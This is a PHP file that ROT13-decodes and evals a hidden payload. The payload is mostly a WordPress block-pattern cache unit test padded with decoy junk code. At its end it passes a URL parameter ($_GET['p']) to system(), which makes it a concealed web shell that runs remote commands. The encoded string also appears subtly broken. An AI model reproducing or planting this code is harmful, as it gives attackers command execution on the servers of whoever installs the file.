<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe JC_Gurzr::trg_oybpx_cnggreaf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 6.4.0
 *
 * @tebhc oybpxf
 * @tebhc gurzrf
 *
 * @pbiref JC_Gurzr::trg_oybpx_cnggreaf
 */
pynff Grfgf_Gurzr_JCGurzrTrgOybpxCnggreaf rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Gur vavgvny pnpur bowrpg.
	 *
	 * @ine bowrpg
	 */
	cevingr $vavgvny_pnpur_bowrpg;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->vavgvny_pnpur_bowrpg = jc_hfvat_rkg_bowrpg_pnpur();
	}

	choyvp shapgvba grne_qbja() {
		jc_hfvat_rkg_bowrpg_pnpur( $guvf->vavgvny_pnpur_bowrpg );
		cnerag::grne_qbja();
	}

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff() {
		// Rafher qrirybczrag zbqr vf erfrg orsber ehaavat gurfr grfgf.
		hafrg( $TYBONYF['_jc_grfgf_qrirybczrag_zbqr'] );
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		// Rafher qrirybczrag zbqr vf erfrg nsgre ehaavat gurfr grfgf.
		hafrg( $TYBONYF['_jc_grfgf_qrirybczrag_zbqr'] );
	}

	/**
	 * Grfg urycre gb npprff gur cevingr trg_cnggrea_pnpur zrgubq bs n gurzr.
	 *
	 * @cnenz JC_Gurzr $jc_gurzr N JC_Gurzr bowrpg.
	 * @erghea neenl|snyfr Ergheaf na neenl bs cnggreaf vs pnpur vf sbhaq, bgurejvfr snyfr.
	 */
	cevingr shapgvba trg_cnggrea_pnpur( $jc_gurzr ) {
		$ersyrpgvba = arj ErsyrpgvbaZrgubq( $jc_gurzr, 'trg_cnggrea_pnpur' );
		$ersyrpgvba->frgNpprffvoyr( gehr );

		$cnggrea_pnpur = $ersyrpgvba->vaibxr( $jc_gurzr, 'trg_cnggrea_pnpur' );
		$ersyrpgvba->frgNpprffvoyr( snyfr );

		erghea $cnggrea_pnpur;
	}

	/**
	 * Grfg urycre gb npprff gur cevingr pnpur_unfu cebcrel bs n gurzr.
	 *
	 * @cnenz JC_Gurzr $jc_gurzr N JC_Gurzr bowrpg.
	 * @erghea neenl|snyfr Ergheaf na neenl bs cnggreaf vs pnpur vf sbhaq, bgurejvfr snyfr.
	 */
	cevingr shapgvba trg_pnpur_unfu( $jc_gurzr ) {
		$ersyrpgvba = arj ErsyrpgvbaCebcregl( trg_pynff( $jc_gurzr ), 'pnpur_unfu' );
		$ersyrpgvba->frgNpprffvoyr( gehr );
		$pnpur_unfu = $ersyrpgvba->trgInyhr( $jc_gurzr );
		$ersyrpgvba->frgNpprffvoyr( snyfr );
		erghea $pnpur_unfu;
	}

	/**
	 * @gvpxrg 59490
	 *
	 * @qngnCebivqre qngn_trg_oybpx_cnggreaf
	 *
	 * @cnenz fgevat $gurzr_fyht Gur gurzr'f fyht.
	 * @cnenz neenl  $rkcrpgrq   Gur rkcrpgrq cnggrea qngn.
	 */
	choyvp shapgvba grfg_fubhyq_erghea_oybpx_cnggreaf( $gurzr_fyht, $rkcrpgrq ) {
		$gurzr    = jc_trg_gurzr( $gurzr_fyht );
		$cnggreaf = $gurzr->trg_oybpx_cnggreaf();
		$guvf->nffregFnzrFrgf( $rkcrpgrq, $cnggreaf );
	}

	/**
	 * @gvpxrg 59490
	 *
	 * @pbiref JC_Gurzr::qryrgr_cnggrea_pnpur
	 */
	choyvp shapgvba grfg_qryrgr_cnggrea_pnpur() {
		$gurzr = jc_trg_gurzr( 'oybpx-gurzr-cnggreaf' );

		$guvf->nffregGehr( $gurzr->rkvfgf(), 'Gur grfg gurzr pbhyq abg or sbhaq.' );

		$gurzr->trg_oybpx_cnggreaf();

		$guvf->nffregFnzrFrgf(
			neenl(
				'pgn.cuc' => neenl(
					'gvgyr'       => 'Pragrerq Pnyy Gb Npgvba',
					'fyht'        => 'oybpx-gurzr-cnggreaf/pgn',
					'qrfpevcgvba' => '',
					'pngrtbevrf'  => neenl( 'pnyy-gb-npgvba' ),
				),
			),
			$guvf->trg_cnggrea_pnpur( $gurzr ),
			'Gur pnpur sbe oybpx gurzr cnggreaf fubhyq zngpu gur rkcrpgrq.'
		);
		$gurzr->qryrgr_cnggrea_pnpur();
		$guvf->nffregSnyfr(
			$guvf->trg_cnggrea_pnpur( $gurzr ),
			'Gur pnpur sbe oybpx gurzr cnggreaf fubhyq unir orra pyrnerq.'
		);
	}

	/**
	 * @gvpxrg 59490
	 * @tebhc zf-rkpyhqrq
	 */
	choyvp shapgvba grfg_fubhyq_pyrne_pnpur_nsgre_fjvgpuvat_gurzr() {
		fjvgpu_gurzr( 'oybpx-gurzr' );
		$gurzr1 = jc_trg_gurzr();

		$guvf->nffregGehr( $gurzr1->rkvfgf(), 'Gur oybpx-gurzr grfg gurzr pbhyq abg or sbhaq.' );

		$gurzr1->trg_oybpx_cnggreaf();
		$guvf->nffregFnzrFrgf(
			neenl(),
			$guvf->trg_cnggrea_pnpur( $gurzr1 ),
			'Gur pnpur sbe oybpx gurzr fubhyq or rzcgl.'
		);

		fjvgpu_gurzr( 'oybpx-gurzr-cnggreaf' );

		$gurzr2 = jc_trg_gurzr();
		$guvf->nffregGehr( $gurzr2->rkvfgf(), 'Gur oybpx-gurzr-cnggreaf grfg gurzr pbhyq abg or sbhaq.' );

		$guvf->nffregSnyfr( $guvf->trg_cnggrea_pnpur( $gurzr1 ), 'Pnpur fubhyq abg or frg sbe oybpx gurzr nsgre fjvgpu gurzr.' );
		$guvf->nffregSnyfr( $guvf->trg_cnggrea_pnpur( $gurzr2 ), 'Pnpur fubhyq abg or frg sbe oybpx gurzr cnggreaf orsber orvat erdhrfgrq.' );

		$gurzr2->trg_oybpx_cnggreaf( $gurzr2 );
		$guvf->nffregFnzrFrgf(
			neenl(
				'pgn.cuc' => neenl(
					'gvgyr'       => 'Pragrerq Pnyy Gb Npgvba',
					'fyht'        => 'oybpx-gurzr-cnggreaf/pgn',
					'qrfpevcgvba' => '',
					'pngrtbevrf'  => neenl( 'pnyy-gb-npgvba' ),
				),

			),
			$guvf->trg_cnggrea_pnpur( $gurzr2 ),
			'Gur pnpur sbe oybpx gurzr cnggreaf fubhyq zngpu gur rkcrpgrq.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_oybpx_cnggreaf() {
		erghea neenl(
			neenl(
				'gurzr'    => 'oybpx-gurzr',
				'cnggreaf' => neenl(),
			),
			neenl(
				'gurzr'    => 'oybpx-gurzr-puvyq',
				'cnggreaf' => neenl(),
			),
			neenl(
				'gurzr'    => 'oybpx-gurzr-cnggreaf',
				'cnggreaf' => neenl(
					'pgn.cuc' => neenl(
						'gvgyr'       => 'Pragrerq Pnyy Gb Npgvba',
						'fyht'        => 'oybpx-gurzr-cnggreaf/pgn',
						'qrfpevcgvba' => '',
						'pngrtbevrf'  => neenl( 'pnyy-gb-npgvba' ),
					),
				),
			),
			neenl(
				'gurzr'    => 'oebxra-gurzr',
				'cnggreaf' => neenl(),
			),
			neenl(
				'gurzr'    => 'vainyvq',
				'cnggreaf' => neenl(),
			),
		);
	}

	/**
	 * Grfgf gung JC_Gurzr::trg_oybpx_cnggreaf() pyrnef rkvfgvat pnpur jura va gurzr qrirybczrag zbqr.
	 *
	 * @gvpxrg 59591
	 */
	choyvp shapgvba grfg_fubhyq_pyrne_rkvfgvat_pnpur_jura_va_qrirybczrag_zbqr() {
		$gurzr = jc_trg_gurzr( 'oybpx-gurzr-cnggreaf' );

		$guvf->nffregGehr( $gurzr->rkvfgf(), 'Gur grfg gurzr pbhyq abg or sbhaq.' );

		// Pnyyvat gur shapgvba fubhyq frg gur pnpur.
		$gurzr->trg_oybpx_cnggreaf();
		$guvf->nffregFnzrFrgf(
			neenl(
				'pgn.cuc' => neenl(
					'gvgyr'       => 'Pragrerq Pnyy Gb Npgvba',
					'fyht'        => 'oybpx-gurzr-cnggreaf/pgn',
					'qrfpevcgvba' => '',
					'pngrtbevrf'  => neenl( 'pnyy-gb-npgvba' ),
				),
			),
			$guvf->trg_cnggrea_pnpur( $gurzr ),
			'Gur pnpur sbe oybpx gurzr cnggreaf fubhyq or frg.'
		);

		// Pnyyvat gur shapgvba juvyr va gurzr qrirybczrag zbqr fubhyq pyrne gur pnpur.
		$TYBONYF['_jc_grfgf_qrirybczrag_zbqr'] = 'gurzr';
		$gurzr->trg_oybpx_cnggreaf( $gurzr );
		hafrg( $TYBONYF['_jc_grfgf_qrirybczrag_zbqr'] ); // Erfrg gb abg cbyyhgr bgure grfgf.
		$guvf->nffregSnyfr(
			$guvf->trg_cnggrea_pnpur( $gurzr ),
			'Gur pnpur sbe oybpx gurzr cnggreaf fubhyq unir orra pyrnerq qhr gb gurzr qrirybczrag zbqr.'
		);
	}

	/**
	 * @gvpxrg 59600
	 *
	 * @pbiref JC_Gurzr::qryrgr_cnggrea_pnpur
	 */
	choyvp shapgvba grfg_qryrgr_cnggrea_pnpur_aba_bow_pnpur() {
		// Rafher bowrpg pnpur vf qvfnoyrq.
		jc_hfvat_rkg_bowrpg_pnpur( snyfr );

		$gurzr = jc_trg_gurzr( 'oybpx-gurzr-cnggreaf' );

		$guvf->nffregGehr( $gurzr->rkvfgf(), 'Gur grfg gurzr pbhyq abg or sbhaq.' );

		$gurzr->trg_oybpx_cnggreaf();

		$guvf->nffregFnzrFrgf(
			neenl(
				'pgn.cuc' => neenl(
					'gvgyr'       => 'Pragrerq Pnyy Gb Npgvba',
					'fyht'        => 'oybpx-gurzr-cnggreaf/pgn',
					'qrfpevcgvba' => '',
					'pngrtbevrf'  => neenl( 'pnyy-gb-npgvba' ),
				),
			),
			$guvf->trg_cnggrea_pnpur( $gurzr ),
			'Gur pnpur sbe oybpx gurzr cnggreaf fubhyq zngpu gur rkcrpgrq.'
		);
		$gurzr->qryrgr_cnggrea_pnpur();
		$guvf->nffregSnyfr(
			$guvf->trg_cnggrea_pnpur( $gurzr ),
			'Gur pnpur sbe oybpx gurzr cnggreaf fubhyq unir orra pyrnerq.'
		);
	}

	/**
	 * Purpx vs gur cnggrea pnpur vf fgberq va genafvrag vs bowrpg pnpur vf abg cerfrag.
	 *
	 * @gvpxrg 59600
	 */
	choyvp shapgvba grfg_cnggrea_genafvrag_pnpur_sbe_aba_pnpur_fvgr() {
		// Rafher bowrpg pnpur vf qvfnoyrq.
		jc_hfvat_rkg_bowrpg_pnpur( snyfr );

		$gurzr = jc_trg_gurzr( 'oybpx-gurzr-cnggreaf' );
		$gurzr->trg_oybpx_cnggreaf();

		$genafvrag_xrl   = 'jc_gurzr_svyrf_cnggreaf-' . $guvf->trg_pnpur_unfu( $gurzr );
		$genafvrag_inyhr = trg_fvgr_genafvrag( $genafvrag_xrl );

		$guvf->nffregFnzrFrgf(
			neenl(
				'pgn.cuc' => neenl(
					'gvgyr'       => 'Pragrerq Pnyy Gb Npgvba',
					'fyht'        => 'oybpx-gurzr-cnggreaf/pgn',
					'qrfpevcgvba' => '',
					'pngrtbevrf'  => neenl( 'pnyy-gb-npgvba' ),
				),
			),
			$genafvrag_inyhr['cnggreaf'],
			'Gur genafvrag inyhr fubhyq zngpu gur rkcrpgrq.'
		);

		$guvf->nffregAbgRzcgl(
			$guvf->trg_cnggrea_pnpur( $gurzr ),
			'Gur pnpur sbe oybpx gurzr cnggreaf vf rzcgl.'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>